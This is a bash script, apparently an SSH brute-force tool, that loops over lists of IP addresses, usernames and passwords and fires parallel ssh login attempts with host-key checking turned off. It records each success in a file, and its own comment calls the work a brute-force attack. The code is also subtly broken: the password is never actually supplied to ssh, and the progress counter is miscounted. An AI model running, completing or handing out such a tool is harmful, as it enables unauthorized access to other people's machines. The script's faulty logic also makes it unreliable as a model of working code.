#!/bin/bash

# Set the maximum number of concurrent threads
MAX_THREADS=100

# Set the timeout for each connection attempt
TIMEOUT=10

# Check if required tools are installed
command -v ssh >/dev/null 2>&1 || { echo "This script requires the 'ssh' command, which is not installed. Aborting." >&2; exit 1; }
command -v tee >/dev/null 2>&1 || { echo "This script requires the 'tee' command, which is not installed. Aborting." >&2; exit 1; }

# Check command line arguments
if [ "$#" -lt 3 ]; then
    echo "Usage: $0 <ip_list_file> <user_list_file> <password_list_file> [-T <max_threads>] [-t <timeout>]"
    exit 1
fi

IP_LIST_FILE="$1"
USER_LIST_FILE="$2"
PASSWORD_LIST_FILE="$3"

shift 3

# Parse optional arguments
while [[ "$#" -gt 0 ]]; do
    case $1 in
        -T) MAX_THREADS="$2"; shift ;;
        -t) TIMEOUT="$2"; shift ;;
        *) echo "Unknown argument: $1"; exit 1 ;;
    esac
    shift
done

# Read the input files
IPS=($(cat "$IP_LIST_FILE"))
USERS=($(cat "$USER_LIST_FILE"))
PASSWORDS=($(cat "$PASSWORD_LIST_FILE"))

# Calculate the total number of combinations
TOTAL_COMBINATIONS=$((${#IPS[@]} * ${#USERS[@]} * ${#PASSWORDS[@]}))

# Set up the progress bar
echo -e "| 0%      25%      50%      75%     100% |"
echo -en "| "

# Perform the brute-force attack
CURRENT_COMBINATION=0
for ip in "${IPS[@]}"; do
    for user in "${USERS[@]}"; do
        for password in "${PASSWORDS[@]}"; do
            if [[ "$CURRENT_COMBINATION" -ge "$((TOTAL_COMBINATIONS * 25 / 100))" ]]; then
                echo -n "="
                CURRENT_COMBINATION=$((CURRENT_COMBINATION + 1))
            fi
            if [[ "$CURRENT_COMBINATION" -ge "$((TOTAL_COMBINATIONS * 50 / 100))" ]]; then
                echo -n "="
                CURRENT_COMBINATION=$((CURRENT_COMBINATION + 1))
            fi
            if [[ "$CURRENT_COMBINATION" -ge "$((TOTAL_COMBINATIONS * 75 / 100))" ]]; then
                echo -n "="
                CURRENT_COMBINATION=$((CURRENT_COMBINATION + 1))
            fi
            if [[ "$CURRENT_COMBINATION" -ge "$TOTAL_COMBINATIONS" ]]; then
                echo -n "="
                echo -e " |"
            fi
            (
                timeout "$TIMEOUT" ssh -o ConnectTimeout=5 -o StrictHostKeyChecking=no "$user@$ip" "exit 0" 2>/dev/null
                if [[ "$?" -eq 0 ]]; then
                    echo "Success: $ip $user $password" | tee -a "Good.txt"
                fi
            ) &
            if [[ "$(jobs -r | wc -l)" -ge "$MAX_THREADS" ]]; then
                wait -n
            fi
            CURRENT_COMBINATION=$((CURRENT_COMBINATION + 1))
        done
    done
done
wait
